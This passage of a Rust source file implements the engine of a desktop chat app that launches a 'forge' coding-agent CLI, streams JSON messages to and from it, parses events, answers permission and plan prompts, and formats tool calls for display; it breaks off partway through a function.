//! The engine: each chat is one ForgeCLI process (`forge`), driven over its
//! IDE host protocol (`forge -p --input-format stream-json --output-format
//! stream-json`, ForgeCLI's docs/CLI.md). Your messages go to its stdin as
//! `user` lines; its stdout is NDJSON that `Parser` turns into `Event`s for
//! the transcript. Permission prompts arrive as `can_use_tool` control
//! requests and are answered with the card's verdict.
//!
//! The endpoint comes from the profile in use (`endpoints.rs`): its URL,
//! model and key go to the process as `FORGE_*` variables, never on its
//! command line and never into a file.
//!
//! Which `forge`: `FORGE_CLI`, else `forge` beside this app's executable,
//! else `forge` on PATH.

use std::io::{BufRead, BufReader, Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::{Arc, Mutex};

use serde_json::{json, Value};

use crate::endpoints::{Profile, Wire};
use crate::modes::ModeId;
use crate::state::{DiffKind, DiffLine, Review, ToolCall, ToolKind, ToolStatus};

/// What the process said, in the order it said it.
#[derive(Debug, Clone, PartialEq)]
pub enum Event {
    /// Reply text, as it streams.
    Text(String),
    /// The model's thinking, as it streams.
    Thinking(String),
    /// A new text or thinking block starts: it doesn't run on from the last.
    Break,
    /// ForgeCLI changed the permission mode itself (a plan approved, plan mode
    /// entered, an answer that set a mode): `system/status`, `permissionMode`.
    ModeChanged(String),
    /// A sub-agent's own tool call; `parent` is the call that started it.
    SubTool {
        parent: String,
        id: String,
        name: String,
        input: Value,
    },
    /// A sub-agent's tool call finished.
    SubResult {
        parent: String,
        id: String,
        is_error: bool,
    },
    /// A sub-agent's words (its latest message, which ends as its answer).
    SubText { parent: String, text: String },
    /// A tool call, with its full input.
    ToolUse {
        id: String,
        name: String,
        input: Value,
    },
    /// An HTML page a Write call is writing, as far as it has streamed (the
    /// live design panel shows it forming): at most every few hundred
    /// milliseconds, and once more, whole, when the call is complete.
    Drafting {
        id: String,
        path: String,
        content: String,
    },
    /// A tool call's result.
    ToolResult {
        id: String,
        output: String,
        is_error: bool,
    },
    /// Forge asks before running a tool.
    Ask {
        request_id: String,
        tool_use_id: String,
        tool_name: String,
        input: Value,
        suggestions: Value,
    },
    /// Forge withdrew a question (the turn was interrupted).
    CancelAsk { request_id: String },
    /// An immediate command's answer (`/btw`): it ends no turn.
    Immediate { text: String, is_error: bool },
    /// A turn ended.
    TurnEnd {
        ms: u64,
        usage: Option<crate::context::Usage>,
        error: Option<String>,
    },
    /// The process couldn't start a run (bad key, unknown model...).
    Error(String),
    /// The process is gone; `detail` is the end of what it wrote on stderr.
    Exited { code: Option<i32>, detail: String },
    /// ForgeCLI took your message as a turn, under this id (`rewind_files` names turns by it).
    /// Also the words, so a queued message that ran as a turn of its own
    /// (its id is then ForgeCLI's) is still recognised.
    UserAccepted { uuid: String, text: String },
    /// The answer to a control request this app sent (`Session::request`).
    ControlReply {
        request_id: String,
        result: Result<Value, String>,
    },
}

// ---------------------------------------------------------------- launching

/// The `forge` executable to run. Never this app itself: Windows names are
/// case-insensitive, so a `Forge.exe` app would also answer to `forge.exe`
/// (and launching it as the engine opens a second window).
pub fn find_cli() -> Option<PathBuf> {
    let me = std::env::current_exe()
        .ok()
        .and_then(|e| e.canonicalize().ok());
    let not_me = |p: &PathBuf| p.is_file() && p.canonicalize().ok() != me;
    if let Some(p) = std::env::var_os("FORGE_CLI")
        .map(PathBuf::from)
        .filter(not_me)
    {
        return Some(p);
    }
    let name = if cfg!(windows) { "forge.exe" } else { "forge" };
    if let Some(dir) = std::env::current_exe()
        .ok()
        .and_then(|e| e.parent().map(PathBuf::from))
    {
        for beside in [dir.join(name), dir.join("bin").join(name)] {
            if not_me(&beside) {
                return Some(beside);
            }
        }
    }
    let path = std::env::var_os("PATH")?;
    std::env::split_paths(&path)
        .map(|d| d.join(name))
        .find(not_me)
}

/// How a chat's process starts: its arguments and the endpoint variables.
#[derive(Debug, Clone, PartialEq)]
pub struct Launch {
    pub args: Vec<String>,
    pub env: Vec<(String, String)>,
}

/// The base URL ForgeCLI wants: it adds `/v1/messages` (Messages API) or
/// `/chat/completions` (OpenAI-compatible) itself.
fn cli_base_url(profile: &Profile) -> String {
    let url = profile.chat_url();
    let suffix = match profile.wire {
        Wire::Anthropic => "/v1/messages",
        Wire::Openai => "/chat/completions",
    };
    url.strip_suffix(suffix).unwrap_or(&url).to_string()
}

/// What the desktop adds to ForgeCLI's system prompt: how replies are shown
/// here. Every diagram is drawn with the Diagram Design skill (`plugin.rs`)
/// unless the user names another format (Mermaid, ASCII, SVG, ...), which
/// then wins; Mermaid and SVG blocks still render inline (`mermaid.rs`).
/// Visual design work goes through the design skill. An HTML page Forge
/// writes is rendered, critiqued and revised before the reply ends (up to
/// three rounds).
pub const SURFACE_PROMPT: &str = "You are running inside Forge Desktop, which renders your replies as Markdown and draws diagrams in the chat. \
Diagram Design is the default for every diagram. When the user asks for a diagram, chart or graph, or one would explain structure \
or flow better than prose (architecture, a request's path, data flow, states, a sequence of calls, a data model, a timeline, a \
comparison), use the diagram-design skill unless the user names another format: it writes a self-contained HTML file around one \
SVG in Forge's own style, and Forge shows that file as a diagram in the chat. Save it in the project (e.g. under docs/diagrams/) \
and name it in your reply. When the user asks for a specific format (Mermaid, ASCII art, SVG, PlantUML, Graphviz, a table...), \
use exactly that format without hesitating. When the diagram-design skill is not available, fall back to a ```mermaid fenced \
block or an ```svg block with one <svg>; both render inline here (Mermaid: flowchart, sequenceDiagram, stateDiagram-v2, \
classDiagram, erDiagram, mindmap, pie, gantt, timeline, journey, xychart-beta, quadrantChart, gitGraph). Put ASCII art in a ```text block so it keeps its alignment. \
For a deck, a page, a prototype, a poster or any other visual design, use the design skill. \
When you write or change an HTML page (a report, a page, a mockup; diagrams included), review it before you call it done. \
Look at it rendered: when Forge's browser tools are available (navigate, screenshot), navigate to the file (a file:// URL), \
take a screenshot, and look at the picture; otherwise read the file back as a reviewer would. Critique it in two passes. Design: hierarchy \
(one clear title, headings that step down), spacing and alignment, contrast and legibility, nothing overflowing or overlapping, \
consistent colours and type, and a layout that also holds in a narrow window. Content: accurate, complete, no placeholder or lorem text, no \
dead links, every section earns its place. Fix what you find and look again; stop when a pass finds nothing worth fixing, or \
after three rounds. Then tell the user, in a line or two, what the review changed.";

/// Which ForgeCLI conversation a process runs: a new one under the id the
/// desktop chose, or one already on disk, resumed.
#[derive(Clone, Copy, Debug, PartialEq)]
pub enum Conversation<'a> {
    New(&'a str),
    Resume(&'a str),
}

pub fn launch(
    profile: &Profile,
    mode: ModeId,
    bypass_allowed: bool,
    conversation: Conversation,
) -> Result<Launch, String> {
    let token = crate::health::token(&profile.auth)?;
    let mut args: Vec<String> = [
        "-p",
        "--input-format",
        "stream-json",
        "--output-format",
        "stream-json",
        "--include-partial-messages",
        "--permission-prompt-tool",
        "stdio",
        "--model",
    ]
    .iter()
    .map(|s| s.to_string())
    .collect();
    args.push(profile.model.clone());
    args.extend(crate::modes::cli_args(mode, bypass_allowed));
    args.extend([
        "--append-system-prompt".to_string(),
        SURFACE_PROMPT.to_string(),
    ]);
    // Forge's plugin: Diagram Design and the office-documents skill.
    if let Some(dir) = crate::plugin::dir() {
        args.extend([
            "--plugin-dir".to_string(),
            dir.to_string_lossy().into_owned(),
        ]);
    }
    // Each accepted message comes back with its turn id: Revert needs it.
    args.push("--replay-user-messages".to_string());
    match conversation {
        Conversation::New(id) => args.extend(["--session-id".to_string(), id.to_string()]),
        Conversation::Resume(id) => args.extend(["--resume".to_string(), id.to_string()]),
    }
    let mut env = vec![];
    let base = cli_base_url(profile);
    match profile.wire {
        Wire::Anthropic => {
            env.push(("FORGE_BASE_URL".into(), base));
            if let Some(t) = token {
                // As the model check sends it: both headers.
                env.push(("FORGE_API_KEY".into(), t.clone()));
                env.push(("FORGE_AUTH_TOKEN".into(), t));
            }
        }
        Wire::Openai => {
            env.push(("FORGE_OPENAI_BASE_URL".into(), base));
            if let Some(t) = token {
                env.push(("FORGE_OPENAI_API_KEY".into(), t));
            }
        }
    }
    if !profile.headers.is_empty() {
        let lines: Vec<String> = profile
            .headers
            .iter()
            .map(|(k, v)| format!("{k}: {v}"))
            .collect();
        env.push(("FORGE_CUSTOM_HEADERS".into(), lines.join("\n")));
    }
    if let Some(w) = profile.capabilities.context_window.filter(|w| *w > 0) {
        env.push(("FORGE_CONTEXT_WINDOW".into(), w.to_string()));
    }
    Ok(Launch { args, env })
}

// ---------------------------------------------------------------- the process

/// One chat's running `forge`. Dropping it ends the process.
pub struct Session {
    stdin: Arc<Mutex<Option<ChildStdin>>>,
    child: Arc<Mutex<Child>>,
    pub events: async_channel::Receiver<Event>,
}

impl Session {
    pub fn spawn(exe: &Path, launch: &Launch, cwd: &Path) -> Result<Session, String> {
        let mut cmd = Command::new(exe);
        cmd.args(&launch.args).current_dir(cwd);
        Self::start(cmd, launch, &[], &exe.display().to_string())
    }

    /// ForgeCLI in a remote project (`remote.rs`): started through WSL, SSH
    /// or docker, its environment written to stdin first, never on a
    /// command line.
    pub fn spawn_remote(
        remote: &crate::remote::Remote,
        forge: &str,
        launch: &Launch,
        extra: &crate::remote::Extra,
    ) -> Result<Session, String> {
        let (cmd, prelude) = crate::remote::launch(remote, forge, &launch.args, &launch.env, extra);
        let none = Launch {
            args: vec![],
            env: vec![],
        };
        Self::start(cmd, &none, &prelude, &remote.target.label())
    }

    fn start(
        mut cmd: Command,
        launch: &Launch,
        prelude: &[u8],
        what: &str,
    ) -> Result<Session, String> {
        cmd.stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Keys and endpoints this app may have inherited must not mix with the profile's.
        for k in [
            "FORGE_BASE_URL",
            "FORGE_API_KEY",
            "FORGE_AUTH_TOKEN",
            "FORGE_OPENAI_BASE_URL",
            "FORGE_OPENAI_API_KEY",
            "FORGE_CUSTOM_HEADERS",
            "FORGE_MODEL",
        ] {
            cmd.env_remove(k);
        }
        cmd.envs(launch.env.iter().map(|(k, v)| (k, v)));
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            const CREATE_NO_WINDOW: u32 = 0x0800_0000;
            cmd.creation_flags(CREATE_NO_WINDOW);
        }
        let mut child = cmd
            .spawn()
            .map_err(|e| format!("could not start {what}: {e}"))?;
        let mut stdin = child.stdin.take();
        if !prelude.is_empty() {
            if let Some(w) = stdin.as_mut() {
                w.write_all(prelude)
                    .and_then(|_| w.flush())
                    .map_err(|e| format!("could not reach {what}: {e}"))?;
            }
        }
        let stdout = child.stdout.take().ok_or("no stdout")?;
        let mut stderr = child.stderr.take().ok_or("no stderr")?;
        let child = Arc::new(Mutex::new(child));
        let (tx, rx) = async_channel::unbounded();

        // stderr: kept (its end) for when the process exits early.
        let tail = Arc::new(Mutex::new(String::new()));
        let err_tail = tail.clone();
        let err_thread = std::thread::spawn(move || {
            let mut buf = [0u8; 4096];
            while let Ok(n) = stderr.read(&mut buf) {
                if n == 0 {
                    break;
                }
                let mut t = err_tail.lock().unwrap();
                t.push_str(&String::from_utf8_lossy(&buf[..n]));
                if t.len() > 8192 {
                    let cut = t.len() - 4096;
                    let cut = (cut..t.len())
                        .find(|i| t.is_char_boundary(*i))
                        .unwrap_or(t.len());
                    t.drain(..cut);
                }
            }
        });

        let waiter = child.clone();
        std::thread::spawn(move || {
            let mut parser = Parser::default();
            for line in BufReader::new(stdout).lines() {
                let Ok(line) = line else { break };
                for ev in parser.line(&line) {
                    if tx.send_blocking(ev).is_err() {
                        return;
                    }
                }
            }
            let _ = err_thread.join();
            let code = waiter.lock().unwrap().wait().ok().and_then(|s| s.code());
            let detail = last_lines(&tail.lock().unwrap(), 6);
            let _ = tx.send_blocking(Event::Exited { code, detail });
        });

        Ok(Session {
            stdin: Arc::new(Mutex::new(stdin)),
            child,
            events: rx,
        })
    }

    fn write(&self, v: Value) -> Result<(), String> {
        let mut guard = self.stdin.lock().unwrap();
        let w = guard.as_mut().ok_or("Forge's input is closed")?;
        writeln!(w, "{v}")
            .and_then(|_| w.flush())
            .map_err(|e| format!("could not reach Forge: {e}"))
    }

    pub fn send(&self, text: &str) -> Result<(), String> {
        self.write(user_line(text))
    }

    /// A message sent while a reply runs, for its next step (`priority:
    /// "next"`): ForgeCLI gives it to the model between tool calls, or
    /// runs it next when the turn ends first; either way it is echoed back
    /// under `uuid` when it lands (`Event::UserAccepted`).
    pub fn queue(&self, text: &str, uuid: &str) -> Result<(), String> {
        let mut line = user_line(text);
        line["priority"] = "next".into();
        line["uuid"] = uuid.into();
        self.write(line)
    }

    /// Take back a queued message that hasn't reached the model; the answer
    /// (`{"cancelled": bool}`) arrives as `Event::ControlReply`.
    pub fn cancel_queued(&self, uuid: &str) -> Result<String, String> {
        self.control(json!({ "subtype": "cancel_queued", "uuid": uuid }))
    }

    /// Your message with its attachments (`attach::content_blocks`).
    pub fn send_content(&self, content: Value) -> Result<(), String> {
        self.write(json!({ "type": "user", "message": { "role": "user", "content": content }, "parent_tool_use_id": null, "session_id": "" }))
    }

    /// A control request whose answer matters: returns its id, and the
    /// answer arrives as `Event::ControlReply`.
    pub fn request(&self, request: Value) -> Result<String, String> {
        self.control(request)
    }

    pub fn answer(
        &self,
        request_id: &str,
        allow: bool,
        always: bool,
        input: &Value,
        suggestions: &Value,
        note: Option<&str>,
    ) -> Result<(), String> {
        self.write(answer_line(request_id, allow, always, input, suggestions, note))
    }

    /// Answer a plan (ExitPlanMode), as Forge for VS Code does.
    pub fn answer_plan(
        &self,
        request_id: &str,
        choice: PlanChoice,
        input: &Value,
    ) -> Result<(), String> {
        self.write(plan_answer_line(request_id, choice, input))
    }

    fn control(&self, request: Value) -> Result<String, String> {
        static NEXT: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(1);
        let id = format!(
            "forge-gpui-{}",
            NEXT.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
        );
        self.write(json!({ "type": "control_request", "request_id": id, "request": request }))
            .map(|_| id)
    }

    pub fn interrupt(&self) -> Result<(), String> {
        self.control(json!({ "subtype": "interrupt" })).map(drop)
    }

    /// Stop one sub-agent (its Task call's id); the turn goes on. Returns
    /// the request's id: the answer says whether it was still running.
    pub fn stop_agent(&self, id: &str) -> Result<String, String> {
        self.control(json!({ "subtype": "stop_task", "task_id": id }))
    }

    /// Stop every sub-agent; the turn goes on.
    pub fn stop_agents(&self) -> Result<String, String> {
        self.control(json!({ "subtype": "stop_task", "all": true }))
    }

    pub fn set_model(&self, model: &str) -> Result<(), String> {
        self.control(json!({ "subtype": "set_model", "model": model }))
            .map(drop)
    }

    pub fn set_mode(&self, mode: ModeId) -> Result<(), String> {
        self.control(
            json!({ "subtype": "set_permission_mode", "mode": mode.permission().cli_name() }),
        )
        .map(drop)
    }
}

impl Drop for Session {
    fn drop(&mut self) {
        // Closing stdin ends the session; kill makes sure.
        self.stdin.lock().unwrap().take();
        let _ = self.child.lock().unwrap().kill();
    }
}

fn last_lines(s: &str, n: usize) -> String {
    let lines: Vec<&str> = s.lines().filter(|l| !l.trim().is_empty()).collect();
    lines[lines.len().saturating_sub(n)..].join("\n")
}

pub fn user_line(text: &str) -> Value {
    json!({ "type": "user", "message": { "role": "user", "content": [{ "type": "text", "text": text }] }, "parent_tool_use_id": null, "session_id": "" })
}

pub fn answer_line(
    request_id: &str,
    allow: bool,
    always: bool,
    input: &Value,
    suggestions: &Value,
    note: Option<&str>,
) -> Value {
    let response = if allow {
        let mut r = json!({ "behavior": "allow", "updatedInput": input });
        if always && suggestions.as_array().is_some_and(|a| !a.is_empty()) {
            r["updatedPermissions"] = suggestions.clone();
        }
        r
    } else {
        let message = match note.map(str::trim).filter(|n| !n.is_empty()) {
            Some(n) => format!("The user declined this and said what to do instead: {n}"),
            None => "The user declined this. Ask what to do instead.".to_string(),
        };
        json!({ "behavior": "deny", "message": message })
    };
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id, "response": response } })
}

/// How a plan is answered: start on it with edits approved automatically or
/// one by one, or keep planning.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum PlanChoice {
    AutoAcceptEdits,
    ApproveEdits,
    KeepPlanning,
}

/// A plan's answer. Yes sets the session's mode in the same answer
/// (`updatedPermissions`, `setMode`), so ForgeCLI leaves plan mode for the
/// mode chosen and says so (`system/status`); No keeps planning.
pub fn plan_answer_line(request_id: &str, choice: PlanChoice, input: &Value) -> Value {
    let set_mode = |mode: &str| {
        json!({ "behavior": "allow", "updatedInput": input,
            "updatedPermissions": [{ "type": "setMode", "mode": mode, "destination": "session" }] })
    };
    let response = match choice {
        PlanChoice::AutoAcceptEdits => set_mode("acceptEdits"),
        PlanChoice::ApproveEdits => set_mode("default"),
        PlanChoice::KeepPlanning => json!({ "behavior": "deny",
            "message": "The user wants to keep planning. Don't start on the plan: ask what to change, and refine it with them." }),
    };
    json!({ "type": "control_response", "response": { "subtype": "success", "request_id": request_id, "response": response } })
}

/// The title of a plan's question card (`ask_text`), which the card shows
/// with the plan's own answers.
pub const PLAN_ASK_TITLE: &str = "Forge's plan is ready. Start on it?";

/// The title of the card asking to run JavaScript in the browser: the card
/// shows the whole script, as code, so nothing in it is hidden.
pub const JS_ASK_TITLE: &str = "Allow Forge to run JavaScript in the browser?";

/// What a browser tool acts on, whole: the URL, the text typed, the script.
fn browser_subject(input: &Value) -> Option<String> {
    [
        "url",
        "text",
        "expression",
        "key",
        "value",
        "selector",
        "url_contains",
        "id",
        "direction",
    ]
    .iter()
    .find_map(|k| input[*k].as_str().filter(|v| !v.is_empty()))
    .map(str::to_string)
}

// ---------------------------------------------------------------- the stream

/// Turns stdout lines into events. Text and thinking come from the streamed
/// deltas; the complete `assistant` message that follows them adds only its
/// tool calls (and its text, when nothing streamed, for a provider that
/// doesn't stream). A sub-agent's messages stay inside its tool call.
#[derive(Default)]
pub struct Parser {
    streamed: bool,
    /// Write calls streaming in, by content block: their id and input so
    /// far, and when their draft was last sent.
    writes: std::collections::HashMap<u64, (String, String, Option<std::time::Instant>)>,
}

/// How often a page being written is shown again while it streams.
const DRAFT_EVERY: std::time::Duration = std::time::Duration::from_millis(250);

impl Parser {
    pub fn line(&mut self, line: &str) -> Vec<Event> {
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            return vec![];
        };
        let nested = v.get("parent_tool_use_id").is_some_and(|p| !p.is_null());
        let mut out = vec![];
        // A sub-agent's messages: its steps, for the Agents panel.
        if nested {
            let parent = v["parent_tool_use_id"]
                .as_str()
                .unwrap_or_default()
                .to_string();
            let content = v["message"]["content"]
                .as_array()
                .cloned()
                .unwrap_or_default();
            match v["type"].as_str() {
                Some("assistant") => {
                    let text: Vec<&str> = content
                        .iter()
                        .filter(|b| b["type"] == "text")
                        .filter_map(|b| b["text"].as_str())
                        .collect();
                    if !text.is_empty() {
                        out.push(Event::SubText {
                            parent: parent.clone(),
                            text: text.join("\n"),
                        });
                    }
                    for b in content.iter().filter(|b| b["type"] == "tool_use") {
                        out.push(Event::SubTool {
                            parent: parent.clone(),
                            id: b["id"].as_str().unwrap_or_default().into(),
                            name: b["name"].as_str().unwrap_or_default().into(),
                            input: b["input"].clone(),
                        });
                    }
                }
                Some("user") => {
                    for b in content.iter().filter(|b| b["type"] == "tool_result") {
                        out.push(Event::SubResult {
                            parent: parent.clone(),
                            id: b["tool_use_id"].as_str().unwrap_or_default().into(),
                            is_error: b["is_error"].as_bool().unwrap_or(false),
                        });
                    }
                }
                _ => {}
            }
            return out;
        }
        match v["type"].as_str() {
            Some("stream_event") if !nested => {
                let ev = &v["event"];
                if ev["type"] == "content_block_start"
                    && matches!(
                        ev["content_block"]["type"].as_str(),
                        Some("text" | "thinking")
                    )
                {
                    out.push(Event::Break);
                }
                // A Write call starting: follow its input as it streams.
                let index = ev["index"].as_u64().unwrap_or(0);
                if ev["type"] == "content_block_start"
                    && ev["content_block"]["type"] == "tool_use"
                    && ev["content_block"]["name"] == "Write"
                {
                    let id = ev["content_block"]["id"].as_str().unwrap_or_default();
                    self.writes.insert(index, (id.to_string(), String::new(), None));
                }
                if ev["type"] == "content_block_stop" {
                    self.writes.remove(&index);
                }
                if ev["type"] == "content_block_delta" {
                    let d = &ev["delta"];
                    match d["type"].as_str() {
                        Some("text_delta") => {
                            self.streamed = true;
                            out.push(Event::Text(d["text"].as_str().unwrap_or_default().into()));
                        }
                        Some("thinking_delta") => {
                            self.streamed = true;
                            out.push(Event::Thinking(
                                d["thinking"].as_str().unwrap_or_default().into(),
                            ));
                        }
                        Some("input_json_delta") => {
                            if let Some((id, json, sent)) = self.writes.get_mut(&index) {
                                json.push_str(d["partial_json"].as_str().unwrap_or_default());
                                let due = sent.is_none_or(|t| t.elapsed() >= DRAFT_EVERY);
                                if let Some((path, content)) = due
                                    .then(|| crate::design::live::partial_write(json))
                                    .flatten()
                                    .filter(|(p, c)| crate::design::live::is_page(p) && !c.is_empty())
                                {
                                    *sent = Some(std::time::Instant::now());
                                    out.push(Event::Drafting {
                                        id: id.clone(),
                                        path,
                                        content,
                                    });
                                }
                            }
                        }
                        _ => {}
                    }
                }
            }
            Some("assistant") if !nested => {
                let streamed = std::mem::take(&mut self.streamed);
                if let Some(err) = v["error"].as_str() {
                    out.push(Event::Error(err.into()));
                }
                for b in v["message"]["content"].as_array().into_iter().flatten() {
                    match b["type"].as_str() {
                        Some("text") if !streamed => out.extend([
                            Event::Break,
                            Event::Text(b["text"].as_str().unwrap_or_default().into()),
                        ]),
                        Some("thinking") if !streamed => out.extend([
                            Event::Break,
                            Event::Thinking(b["thinking"].as_str().unwrap_or_default().into()),
                        ]),
                        Some("tool_use") => out.push(Event::ToolUse {
                            id: b["id"].as_str().unwrap_or_default().into(),
                            name: b["name"].as_str().unwrap_or_default().into(),
                            input: b["input"].clone(),
                        }),
                        _ => {}
                    }
                }
            }
            // Your message, echoed back with the id ForgeCLI gave its turn.
            Some("user") if !nested && v["isReplay"] == true => {
                if let Some(uuid) = v["uuid"].as_str() {
                    let text = v["message"]["content"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .filter_map(|b| b["text"].as_str())
                        .collect::<Vec<_>>()
                        .join("");
                    out.push(Event::UserAccepted {
                        uuid: uuid.to_string(),
                        text,
                    });
                }
            }
            Some("control_response") => {
                let r = &v["response"];
                let request_id = r["request_id"].as_str().unwrap_or_default().to_string();
                let result = if r["subtype"] == "success" {
                    Ok(r["response"].clone())
                } else {
                    Err(r["error"]
                        .as_str()
                        .unwrap_or("the request failed")
                        .to_string())
                };
                out.push(Event::ControlReply { request_id, result });
            }
            Some("system") if v["subtype"] == "status" => {
                if let Some(m) = v["permissionMode"].as_str() {
                    out.push(Event::ModeChanged(m.to_string()));
                }
            }
            Some("user") if !nested => {
                let content = &v["message"]["content"];
                for b in content.as_array().into_iter().flatten() {
                    if b["type"] == "tool_result" {
                        out.push(Event::ToolResult {
                            id: b["tool_use_id"].as_str().unwrap_or_default().into(),
                            output: result_text(&b["content"]),
                            is_error: b["is_error"].as_bool().unwrap_or(false),
                        });
                    }
                }
            }
            Some("control_request") => {
                let r = &v["request"];
                if r["subtype"] == "can_use_tool" {
                    out.push(Event::Ask {
                        request_id: v["request_id"].as_str().unwrap_or_default().into(),
                        tool_use_id: r["tool_use_id"].as_str().unwrap_or_default().into(),
                        tool_name: r["tool_name"].as_str().unwrap_or_default().into(),
                        input: r["input"].clone(),
                        suggestions: r["permission_suggestions"].clone(),
                    });
                }
            }
            Some("control_cancel_request") => out.push(Event::CancelAsk {
                request_id: v["request_id"].as_str().unwrap_or_default().into(),
            }),
            Some("result") if !nested => {
                // An immediate command's answer (`/status`...) is not a turn.
                if v["immediate"] == true {
                    out.push(Event::Immediate {
                        text: v["result"].as_str().unwrap_or_default().trim().to_string(),
                        is_error: v["is_error"] == true,
                    });
                    return out;
                }
                self.streamed = false;
                let u = &v["usage"];
                let n = |k: &str| u[k].as_u64().unwrap_or(0);
                let usage = u.is_object().then(|| crate::context::Usage {
                    input: n("input_tokens"),
                    cache_creation: n("cache_creation_input_tokens"),
                    cache_read: n("cache_read_input_tokens"),
                    output: n("output_tokens"),
                    estimated: false,
                });
                let interrupted = v["stop_reason"] == "interrupted";
                let error = (v["is_error"] == true && !interrupted).then(|| {
                    let errors: Vec<String> = v["errors"]
                        .as_array()
                        .into_iter()
                        .flatten()
                        .filter_map(|e| e.as_str().map(str::to_string))
                        .collect();
                    if !errors.is_empty() {
                        errors.join("\n")
                    } else {
                        v["result"]
                            .as_str()
                            .filter(|s| !s.is_empty())
                            .unwrap_or("The turn ended with an error.")
                            .to_string()
                    }
                });
                out.push(Event::TurnEnd {
                    ms: v["duration_ms"].as_u64().unwrap_or(0),
                    usage: usage.filter(|u| u.total() > 0),
                    error,
                });
            }
            Some("error") => out.push(Event::Error(
                v["error"]["message"]
                    .as_str()
                    .unwrap_or("Forge could not start the run.")
                    .into(),
            )),
            _ => {}
        }
        out
    }
}

/// A tool result's text: a string, or the text blocks of a list.
fn result_text(c: &Value) -> String {
    match c {
        Value::String(s) => s.clone(),
        Value::Array(a) => a
            .iter()
            .filter_map(|b| b["text"].as_str())
            .collect::<Vec<_>>()
            .join("\n"),
        Value::Null => String::new(),
        other => other.to_string(),
    }
}

// ---------------------------------------------------------------- tool rows

/// A tool call as its row shows it.
pub fn tool_call(name: &str, input: &Value) -> ToolCall {
    let s = |k: &str| input[k].as_str().unwrap_or_default().to_string();
    let (kind, target, note, diff) = match name {
        "Read" | "NotebookRead" => (ToolKind::Read, s("file_path"), None, vec![]),
        "Edit" => (
            ToolKind::Edit,
            s("file_path"),
            None,
            edit_diff(&s("old_string"), &s("new_string")),
        ),
        "MultiEdit" => {
            let mut d = vec![];
            for e in input["edits"].as_array().into_iter().flatten() {
                d.extend(edit_diff(
                    e["old_string"].as_str().unwrap_or_default(),
                    e["new_string"].as_str().unwrap_or_default(),
                ));
            }
            (ToolKind::Edit, s("file_path"), None, d)
        }
        "NotebookEdit" => (ToolKind::Edit, s("notebook_path"), None, vec![]),
        "Write" => (
            ToolKind::Write,
            s("file_path"),
            None,
            edit_diff("", &s("content")),
        ),
        "Bash" | "PowerShell" => (
            ToolKind::Bash,
            s("command"),
            input["description"].as_str().map(str::to_string),
            vec![],
        ),
        "Grep" | "Glob" | "LS" => {
            let mut t = s("pattern");
            if let Some(p) = input["path"].as_str().filter(|p| !p.is_empty()) {
                t = format!("{t} in {p}");
            }
            (ToolKind::Search, t, None, vec![])
        }
        "WebFetch" => (ToolKind::Web, s("url"), None, vec![]),
        "WebSearch" => (ToolKind::WebSearch, s("query"), None, vec![]),
        // A plan is kept whole, a line per diff row, so the side panel
        // (and a reloaded chat) can show it.
        "ExitPlanMode" => (
            ToolKind::Other,
            "ExitPlanMode".to_string(),
            Some("Proposed a plan".to_string()),
            lines(&s("plan")),
        ),
        // The task list: `[x]` done, `[~]` in progress, `[ ]` to do.
        "TodoWrite" => {
            let todos = input["todos"].as_array().cloned().unwrap_or_default();
            let done = todos.iter().filter(|t| t["status"] == "completed").count();
            let rows: Vec<String> = todos
                .iter()
                .map(|t| {
                    let mark = match t["status"].as_str() {
                        Some("completed") => "[x]",
                        Some("in_progress") => "[~]",
                        _ => "[ ]",
                    };
                    format!("{mark} {}", t["content"].as_str().unwrap_or_default())
                })
                .collect();
            (
                ToolKind::Other,
                "TodoWrite".to_string(),
                Some(format!("{done} of {} done", todos.len())),
                lines(&rows.join("\n")),
            )
        }
        // The browser's tools say what they act on: a URL, the text typed.
        browser if browser.starts_with(crate::browser::TOOL_PREFIX) => {
            let what = browser_subject(input)
                .map(|v| {
                    let one_line = v.split_whitespace().collect::<Vec<_>>().join(" ");
                    if one_line.chars().count() > 120 {
                        format!("{}…", one_line.chars().take(120).collect::<String>())
                    } else {
                        one_line
                    }
                })
                .or_else(|| input["index"].as_u64().map(|i| format!("element {i}")));
            (ToolKind::Other, browser.to_string(), what, vec![])
        }
        // A skill reads as its name, without its plugin's prefix.
        "Skill" => {
            let skill = s("skill");
            let name = skill
                .rsplit(':')
                .next()
                .unwrap_or(&skill)
                .trim_start_matches('/');
            (ToolKind::Other, format!("skill {name}"), None, vec![])
        }
        other => {
            let summary = input["description"]
                .as_str()
                .or(input["prompt"].as_str())
                .map(|d| d.chars().take(80).collect::<String>());
            (ToolKind::Other, other.to_string(), summary, vec![])
        }
    };
    ToolCall {
        kind,
        target: target.into(),
        note: note.map(Into::into),
        status: ToolStatus::Running,
        output: "".into(),
        diff,
        open: kind == ToolKind::Bash,
        full: false,
        review: Review::Open,
    }
}

/// Text kept as unchanged diff rows, a line each.
fn lines(text: &str) -> Vec<DiffLine> {
    text.lines()
        .take(2000)
        .map(|l| DiffLine {
            kind: DiffKind::Same,
            text: l.to_string().into(),
        })
        .collect()
}

/// Removed lines, then added ones; long text is cut.
fn edit_diff(old: &str, new: &str) -> Vec<DiffLine> {
    const MAX: usize = 400;
    let del = old.lines().map(|l| DiffLine {
        kind: DiffKind::Del,
        text: l.to_string().into(),
    });
    let add = new.lines().map(|l| DiffLine {
        kind: DiffKind::Add,
        text: l.to_string().into(),
    });
    del.chain(add).take(MAX).collect()
}

/// What a permission card says about a tool call.
pub fn ask_text(tool: &str, input: &Value) -> (String, String) {
    if tool == "ExitPlanMode" {
        return (
            PLAN_ASK_TITLE.to_string(),
            "The plan is in the side panel's Plan tab. Approve it to leave Plan mode and start, or keep planning."
                .to_string(),
        );
    }
    // Questions for you, answered in a form (`ui/question_form.rs`).
    if tool == "AskUserQuestion" {
        let asked: Vec<&str> = input["questions"]
            .as_array()
            .into_iter()
            .flatten()
            .filter_map(|q| q["question"].as_str())
            .collect();
        return ("Forge's questions".to_string(), asked.join(" · "));
    }
    let call = tool_call(tool, input);
    let title = match call.kind {
        ToolKind::Edit | ToolKind::Write => {
